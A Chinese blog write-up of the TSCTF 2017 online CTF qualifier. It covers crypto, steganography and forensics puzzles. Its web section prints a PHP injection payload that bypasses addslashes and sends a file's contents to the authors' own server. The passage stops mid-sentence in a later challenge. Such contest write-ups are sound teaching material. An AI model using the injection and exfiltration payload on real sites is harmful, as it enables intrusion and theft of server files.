    <title>TSCTF2017线上初赛WriteUp</title>
    <link href="https://sumygg.com/2017/05/15/tsctf-2017-online-contest-write-up/"/>
    <id>https://sumygg.com/2017/05/15/tsctf-2017-online-contest-write-up/</id>
    <published>2017-05-15T03:10:58.000Z</published>
    <updated>2021-03-16T08:51:02.983Z</updated>
    
    <content type="html"><![CDATA[<p>本着互动娱乐的精神，我们三个人组成了【新建文件夹】队参加了这次TSCTF2017的比赛。比赛题目采用浮动分数值，题目起始分1000，解出的人数越多，题目的分值越低。比赛时长36小时，截止到比赛结束总共放出了30题，我们队解出了其中17题。</p><p>下面说一下我们解出题目的解题思路。题目不是按照难度排列的。</p><h1 id="misc签到"><a class="markdownIt-Anchor" href="#misc签到"></a> 【MISC】签到</h1><p>签到题，关注公众号，给公众号发送消息就可以拿到flag。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image001.png" class="" title="签到题"><h1 id="misclogo"><a class="markdownIt-Anchor" href="#misclogo"></a> 【MISC】logo</h1><p>图片本身是这次比赛主办方战队的logo。似乎有点图片幻想症，起初拿到这张图片后，习惯性的看了一下各种地方，一直没发现什么问题。最后扫了一眼图片二进制，原来flag根本就没藏在图片里。。。直接在图片最后找到了用Base64编码的flag，解码就好了。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image003.png" class="" title="logo编码"><h1 id="misczipcrc"><a class="markdownIt-Anchor" href="#misczipcrc"></a> 【MISC】zipcrc</h1><p>看到题目大概就能想到大体的思路。先打开压缩包看了一下，发现里面有三个文件，crypto、key1、key2和key3。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image005.png" class="" title="压缩包内容"><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image007.png" class="" title="压缩包文件详情"><p>其中，key1、key2和key3都是4字节大小，考虑可以使用CRC碰撞，碰撞出文件的内容。碰撞脚本使用了github上一个开源的项目<a href="https://github.com/kmyk/zip-crc-cracker">https://github.com/kmyk/zip-crc-cracker</a>。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image009.png" class="" title="CRC碰撞"><p>拿到三个文件后，之后的思路陷入了一个误区，被卡住了。首先尝试了一下key1+key2+key3的组合作为压缩包的密码，无果后以为需要通过明文攻击解压缩包的密码key。于是寻找这方面的资料，找到 <code>pkcrack</code>，但是这种攻击方式至少需要<strong>连续</strong>12个字节的<strong>单文件</strong>，显然这样无法解决问题。到这里解题处于停滞状态，只好求助于客服。在说明了我们解出了key1、key2、key3文件的内容后，客服给出的回复是，你们已经解出来了。</p><p>放弃了pkcrack的方向，我们转向了key的组合，发现key3+key2+key1才是正确的压缩包密码。赶紧打开crypto文件看了一下，很容易发现是Base64编码。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image011.png" class="" title="crypto文件内容"><p>解密后是一段Python代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> random, base64</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;TSCTF2017&#x27;</span></span><br><span class="line"></span><br><span class="line">ctMessage = <span class="string">&#x27;k6QqE3TU2qfqytHIatHD6DUOT+7D6vPXFUofQyF7dXjPhkPX9OnN/W5OxkvMfa0=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crypt</span>(<span class="params">data, key</span>):</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    flow = <span class="built_in">range</span>(<span class="number">256</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        x = (x + flow[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        flow[i], flow[x] = flow[x], flow[i]</span><br><span class="line">    x = y = <span class="number">0</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">        x = (x + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        y = (y + flow[x]) % <span class="number">256</span></span><br><span class="line">        flow[x], flow[y] = flow[y], flow[x]</span><br><span class="line">        out.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(char) ^ flow[(flow[x] + flow[y]) % <span class="number">256</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(out)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tsencode</span>(<span class="params">data, key=key, encode=base64.b64encode, salt_length=<span class="number">16</span></span>):</span></span><br><span class="line">    salt = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(salt_length):</span><br><span class="line">        salt += <span class="built_in">chr</span>(random.randrange(<span class="number">256</span>))</span><br><span class="line">    data = salt + crypt(data, sha1(key + salt).digest())</span><br><span class="line">    <span class="keyword">if</span> encode:</span><br><span class="line">        data = encode(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>照葫芦画瓢，写了一段解密代码，成功解出了flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tsdecode</span>(<span class="params">data, key=key, decode=base64.b64decode, salt_length=<span class="number">16</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> decode:</span><br><span class="line">        data = decode(data)</span><br><span class="line">    salt = data[<span class="number">0</span>:salt_length]</span><br><span class="line">    data = data[salt_length:]</span><br><span class="line">    <span class="keyword">return</span> crypt(data, sha1(key + salt).digest())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> tsdecode(ctMessage, key)</span><br></pre></td></tr></table></figure><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image013.png" class="" title="解密结果"><h1 id="misc至尊宝"><a class="markdownIt-Anchor" href="#misc至尊宝"></a> 【MISC】至尊宝</h1><p>这又是一张图片题。“我的意中人是一位盖世英雄,有一天他会身披金甲圣衣、驾着七彩祥云来娶我。哎，至尊宝，你的头箍呢？”看到题目描述一般的思路是想办法将“头箍”找到。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image14.bmp" class="" title="至尊宝"><p>可惜这个思路先被文件末尾的<code>rar</code>打断了，整个图片文件存在两个文件头，一个bmp文件头，一个rar文件头。我们把rar文件提取出来，却发现压缩包被加密了，无法打开。就这样被卡在这里了。</p><p>后来听说有人把头箍找到了，感觉这道题又有了思路。通过查找bmp文件格式，找到了可以修改图片高度的地方，试过几次后把高度改到了最大的高度。得到了一张不明所以的图片。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image016.png" class="" title="带有“头箍”的至尊宝"><p>题目已经放出了一个提示“MD5”，猜测上面的颜色是否跟md5有关。将颜色转码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#437b93</span><br><span class="line">#0db84b</span><br><span class="line">#8079c2</span><br><span class="line">#dd804a</span><br><span class="line">#71936b</span><br><span class="line">#5f3ab9</span><br><span class="line">#78c64a</span><br><span class="line">#766522</span><br><span class="line">#24e2e2</span><br><span class="line">#31e05f</span><br><span class="line">#ca3571</span><br><span class="line">#f262d7</span><br><span class="line">#96bed1</span><br><span class="line">#ab30e8</span><br><span class="line">#a2d5a8</span><br><span class="line">#ddee6f</span><br></pre></td></tr></table></figure><p>每32位一组，正好分成三组，组成MD5后放到网站上解码，得到了 <code>something</code> <code>atthe</code> <code>bottom</code> 的提示？！！，bottom不就是那个rar文件？这又陷入了一次僵局，最后死马当活马医。组合起来当成密码，成功解密了rar压缩包。</p><p>之后的道路比较顺利，压缩包里有个pptx文件，改成zip文件解压，然后挨个文件翻阅，最后找到了flag。</p><h1 id="misceasycrypto"><a class="markdownIt-Anchor" href="#misceasycrypto"></a> 【MISC】easyCrypto</h1><p>这道题是一个解码题，阅读代码，然后写出解码代码。解码代码在decode里。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">cypher_text = <span class="string">&#x27;DgYiZFttExBafXJPPn8BNhI9cwEhaUMgPmg+IA==&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;xxxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line">iv = struct.unpack(<span class="string">&quot;I&quot;</span>, <span class="string">&#x27;x1a0&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;iv is &#x27;</span>, <span class="built_in">hex</span>(iv)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crypto</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> data ^ data &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">datas, iv</span>):</span></span><br><span class="line">    cypher = []</span><br><span class="line">    datas_length = <span class="built_in">len</span>(datas)</span><br><span class="line">    cypher += [crypto(datas[<span class="number">0</span>] ^ iv)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, datas_length):</span><br><span class="line">        cypher += [crypto(cypher[i-<span class="number">1</span>] ^ datas[i])]</span><br><span class="line"></span><br><span class="line">    cyphertext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cypher:</span><br><span class="line">        cyphertext += struct.pack(<span class="string">&quot;I&quot;</span>, c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(cyphertext)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">4</span> - <span class="built_in">len</span>(flag) % <span class="number">4</span></span><br><span class="line"><span class="keyword">if</span> padding != <span class="number">0</span>:</span><br><span class="line">    flag = flag + <span class="string">&quot;\x00&quot;</span> * padding</span><br><span class="line"></span><br><span class="line">datas = struct.unpack(<span class="string">&quot;I&quot;</span> * (<span class="built_in">len</span>(flag) / <span class="number">4</span>), flag)</span><br><span class="line"><span class="built_in">print</span> encode(datas, iv)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">cypher_text,iv</span>):</span></span><br><span class="line">    cypher_text = base64.b64decode(cypher_text)</span><br><span class="line">    padding = <span class="number">4</span> - <span class="built_in">len</span>(cypher_text) % <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> padding != <span class="number">0</span>:</span><br><span class="line">        cypher_text = cypher_text + <span class="string">&quot;\x00&quot;</span> * padding</span><br><span class="line"></span><br><span class="line">    l = cypher_text</span><br><span class="line">    crypher = struct.unpack(<span class="string">&quot;I&quot;</span>*(<span class="built_in">len</span>(l)/<span class="number">4</span>),l)</span><br><span class="line">    datas = []</span><br><span class="line">    datas += [ decrypto(crypher[<span class="number">0</span>]) ^ iv ]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(crypher)):</span><br><span class="line">        datas += [decrypto(crypher[i]) ^ crypher[i-<span class="number">1</span>]]</span><br><span class="line">    <span class="keyword">return</span> datas</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypto</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> data ^ (data &gt;&gt; <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">datas = decode(cypher_text,iv)</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> datas:</span><br><span class="line">    res += struct.pack(<span class="string">&quot;I&quot;</span>,i)</span><br><span class="line"><span class="built_in">print</span> res</span><br></pre></td></tr></table></figure><h1 id="misc神秘的文件"><a class="markdownIt-Anchor" href="#misc神秘的文件"></a> 【MISC】神秘的文件</h1><p>这个题给了一个pcapng文件，用软件打开后开始分析。大概是一个ftp传输过程，由于传输协议未使用加密，泄露了传输文件的内容。传输的文件有两个，一个flag.zip还有一个txt文件。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image058.png" class="" title="txt文件内容"><p>看到txt文件内容后，写了个程序猜测一下明文是什么。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getmd5</span>(<span class="params">s</span>):</span></span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(s)</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line">MD5_pass = <span class="string">&#x27;24885fdab795c41166d6f0067782dc9f&#x27;</span></span><br><span class="line">or_pass = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;%&#x27;</span>]</span><br><span class="line">arr_pass = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;%&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>():</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(arr_pass)&gt;<span class="number">0</span>):</span><br><span class="line">        cur = arr_pass.pop(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span>(getmd5(cur)==MD5_pass):</span><br><span class="line">            <span class="built_in">print</span> cur</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> or_pass:</span><br><span class="line">                arr_pass.append(cur+i)</span><br><span class="line">run()</span><br></pre></td></tr></table></figure><p>解出密码为 ah%kyq$</p><p>有了密码，dump出flag.zip文件，用密码解压缩。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image060.png" class="" title="压缩包文件"><p>解压缩zip文件，拿到其中的文件，把其中的一段用Base64解码 <code>TSCTF&#123;tsctf_revolution_2017_May&#125;</code> 。</p><h1 id="misc四维码"><a class="markdownIt-Anchor" href="#misc四维码"></a> 【MISC】四维码</h1><p>四维码这个题目感觉还是很不错的，不过脑洞还是有点大，基本上就是一步步跟着HINT来的。</p><p>首先题目给了一个gif，其中每一帧有一个二维码，将每一帧扫到的字母拼接起来，得到一个网址 <code>https://twitter.com/pinkotsctf</code> 这是一个twitter账号，账号里只有一条消息，有一张图片。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image062.png" class="" title="四维码twitter"><p>拿到图片后扫了一下二维码，取到 <code>NNSXSPLROJRW6ZDF</code> ，意味不明。这时候有了个HINT，提示用Base32解码，得到<code>key=qrcode</code> 。还是意味不明。</p><p>我们发现了图像上半部分的白色存在不一致的问题，但是找不到什么规律。又分析了一下基本信息，基本上束手无措。此时放出来一个HINT，“谷歌搜图”。通过谷歌搜图，在github找到了一个开源库<a href="https://github.com/fbngrm/Matroschka">fbngrm/Matroschka</a>。</p><p>肯定是用的这个，看这个库的解密命令 <code>python matroschka.py -open -m &lt;mac-password&gt; -k &lt;password&gt; &lt;image&gt;</code> ， <strong>password</strong> 是<code>qrcode</code>， <strong>mac-password</strong> 是个啥？最后试了试，貌似随便的字符串都可以，对图片没有影响。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image064.png" class="" title="解密出来的二维码"><p>解出来的图片不是很清晰，用ps稍微调整了一下，然后扫描一下拿到了一串数字 <code>000000000011010010000111101110101001110110010010011110110010111001010011000010011110100100110000101100100111011000010100101001100001101000111011000101110100001011001001110110010000100110101100100001111010010011000111010110000000000</code>。再次意味不明。。。</p><p>思考过程，ascii码二进制不可能，想到了0-1代表像素。写了个html枚举一下宽度，看看哪个图片最像？</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        #containter &#123;</span><br><span class="line"><span class="css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .white &#123;</span><br><span class="line"><span class="css">            <span class="attribute">background</span>: white;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .black &#123;</span><br><span class="line"><span class="css">            <span class="attribute">background</span>: black;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;containter&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> str = <span class="string">&quot;000000000011010010000111101110101001110110010010011110110010111001010011000010011110100100110000101100100111011000010100101001100001101000111011000101110100001011001001110110010000100110101100100001111010010011000111010110000000000&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> containter = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;containter&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> width = <span class="number">5</span>;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// var linecount = 1;</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> topx = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> onecnt = <span class="number">20</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> linecount = <span class="number">1</span>; linecount &lt; str.length; linecount++) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.length; i++) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> ele = <span class="built_in">document</span>.createElement(<span class="string">&quot;div&quot;</span>);</span></span><br><span class="line"><span class="javascript">                ele.style.position = <span class="string">&quot;absolute&quot;</span>;</span></span><br><span class="line"><span class="javascript">                ele.style.width = width + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="javascript">                ele.style.height = width + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="javascript">                ele.style.left = ((i % linecount) * width) + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="javascript">                ele.style.top = (topx + <span class="built_in">Math</span>.floor(i / linecount) * width) + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (str[i] == <span class="string">&#x27;0&#x27;</span>) &#123;</span></span><br><span class="line"><span class="javascript">                    ele.className = <span class="string">&quot;white&quot;</span>;</span></span><br><span class="line"><span class="javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                    ele.className = <span class="string">&quot;black&quot;</span>;</span></span><br><span class="line">                &#125;</span><br><span class="line">                containter.appendChild(ele);</span><br><span class="line">            &#125;</span><br><span class="line">            if (linecount == str.length-1 &amp;&amp; onecnt &gt; 0) &#123;</span><br><span class="line">                linecount--;</span><br><span class="line">                onecnt--;</span><br><span class="line">                topx += width;</span><br><span class="line"><span class="javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                topx += (<span class="built_in">Math</span>.floor(str.length / linecount) * width + <span class="number">50</span>);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>没有图片符合样子的，好奇怪。。。这道题卡了好久，抱着死马当活马医的心态加宽高度，作为条形码试试。。。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image066.png" class="" title="就是一个条形码"><p>解决了这道题，太好了。</p><h1 id="webweb"><a class="markdownIt-Anchor" href="#webweb"></a> 【WEB】Web</h1><p>上来网页给了一个提示</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image020.png" class="" title="首页提示"><p>访问 <strong>re.php</strong> ，网页给出了该页的php代码。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image022.png" class="" title="re.php"><p>计大意是在 tmp 目录下生成一个随机字符的 php 名，写入了$shell=’’;的句子，然后输入的 shell 参数加入到单引号内，根据提示是要查看 flag.php。关键点是绕过 addslashes 这个函数。</p><p>网上查看了一番，可以用宽字符或双斜线匹配来绕过。但是不知道为什么php的网页回显被关闭了（后来才知道，$shell是要执行的shell命令，不是php命令），于是考虑用发送网络请求获取flag.php的信息。</p><p>构造的参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.105.42.5:44445&#x2F;re.php?shell&#x3D;..&#x2F;flag.phphttp:&#x2F;&#x2F;10.109.33.193&#x2F;index.php?s&#x3D;cdef%5c%27;print%20file_get_contents(substr($shell,11,37).urlencode(file_get_contents(substr($shell,0,11))));&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>在本地http://10.109.33.193搭建一个服务器，来接收php发送的请求。</p><p>最后获得的flag如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]!==<span class="string">&quot;127.0.0.1&quot;</span> &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]!==<span class="string">&quot;::1&quot;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Yeah, flag is here. But flag is so secret that only local users could access it.&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;title&gt;Flag&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;b&gt;Congratulations!&lt;/b&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">You got the flag. Interesting regex, right?.&lt;br&gt;&lt;br&gt;</span><br><span class="line">TSCTF&#123;h4pp9_enj0y_re93x_T0_3x3c__!!!&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h1 id="websimple-shop1"><a class="markdownIt-Anchor" href="#websimple-shop1"></a> 【WEB】Simple Shop1</h1><p>首先查看网站首页，似乎没什么。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image024.png" class="" title="网站首页"><p>注册了一个账号登陆进去看看。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image026.png" class="" title="注册账号"><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image028.png" class="" title="登陆"><p>发现一个像是购物似的列表。有flag呀，但是买不到，因为没有钱。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image030.png" class="" title="购物列表"><p>查看网页源代码，发现表单里有一个奇怪的字段 